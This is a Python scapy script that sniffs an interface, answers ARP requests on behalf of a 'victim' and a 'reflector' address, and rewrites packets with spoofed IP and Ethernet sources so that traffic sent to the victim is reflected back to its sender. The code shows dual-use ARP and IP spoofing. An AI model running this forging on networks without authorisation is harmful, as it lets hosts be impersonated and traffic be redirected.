#! /usr/bin/env python3
import sys, getopt, _thread, uuid
from scapy.all import *

def main(argv):
   interface = ''
   vict_ip = ''
   vict_eth=''
   refl_ip=''
   refl_eth=''
   src_ip=[]
   try:
      opts, args = getopt.getopt(argv,"",["interface=","victim-ip=","victim-ethernet=","reflector-ip=","reflector-ethernet="])
   except getopt.GetoptError:
      print('error')
      sys.exit(2)
   for opt, arg in opts:
      if opt in ("--interface"):
         interface = arg
      elif opt in ("--victim-ip"):
         vict_ip = arg
      elif opt in ("--victim-ethernet"):
         vict_eth = arg
      elif opt in ("--reflector-ip"):
         refl_ip = arg
      elif opt in ("--reflector-ethernet"):
         refl_eth = arg
   x = 'argus: '.join([interface+'\n',vict_ip+'\n',vict_eth+'\n',refl_ip+'\n',refl_eth])
   print(x)
   #print('argus: ').join([interface+'\n',vict_ip+'\n',vict_eth+'\n',refl_ip+'\n',refl_eth])

   def PacketHandler1(pkt):
      if pkt[0][1].dst==vict_ip:
         pkt[0][1].dst=pkt[0][1].src
         pkt[0][1].src=refl_ip
         pkt[0][0].dst=pkt[0][0].src
         pkt[0][0].src=refl_eth
         src_ip.append(pkt[0][1].dst)
         del pkt[0][1].chksum
         if TCP in pkt:
             del pkt[TCP].chksum
         if UDP in pkt:
             del pkt[UDP].chksum
             pkt[0][1].show2()
         sendp(pkt, iface=interface)
   def PacketHandler2(pkt):
      if pkt[0][1].dst==refl_ip:
         pkt[0][1].dst=pkt[0][1].src
         pkt[0][1].src=vict_ip
         pkt[0][0].dst=pkt[0][0].src
         pkt[0][0].src=vict_eth
         del pkt[0][1].chksum
         if TCP in pkt:
            del pkt[TCP].chksum
         if UDP in pkt:
            del pkt[UDP].chksum
         pkt[0][1].show2()
         sendp(pkt, iface=interface)
   def PacketHandler3(pkt):
      if ARP in pkt:
         if pkt[ARP].pdst==vict_ip:
            arp=ARP(pdst=pkt[ARP].psrc,psrc=vict_ip,hwdst=pkt[ARP].hwsrc,hwsrc=vict_eth,op=2)
            eth=Ether(dst=pkt[ARP].hwsrc,src=vict_eth)
            p=eth/arp
            p.show()
            sendp(p,iface=interface)
         if pkt[ARP].pdst==refl_ip:
            arp=ARP(pdst=pkt[ARP].psrc,psrc=refl_ip,hwdst=pkt[ARP].hwsrc,hwsrc=refl_eth,op=2)
            eth=Ether(dst=pkt[ARP].hwsrc,src=refl_eth)
            p=eth/arp
            p.show()
            sendp(p,iface=interface)

   def vic_ip_s(para):
      dpkt = sniff(iface = interface, filter="(tcp or udp or ip) and (dst "+vict_ip+")", prn = PacketHandler1)
   def src_res(para):
      dpkt = sniff(iface = interface, prn = PacketHandler2, filter="(tcp or udp or ip) and (dst "+refl_ip+")")
   def arp_vic(para):
      dpkt = sniff(iface = interface, prn = PacketHandler3, filter="(arp)")

   _thread.start_new_thread(vic_ip_s,("",))
   _thread.start_new_thread(src_res,("",))
   _thread.start_new_thread(arp_vic,("",))

   while 1:
      pass

main(sys.argv[1:])
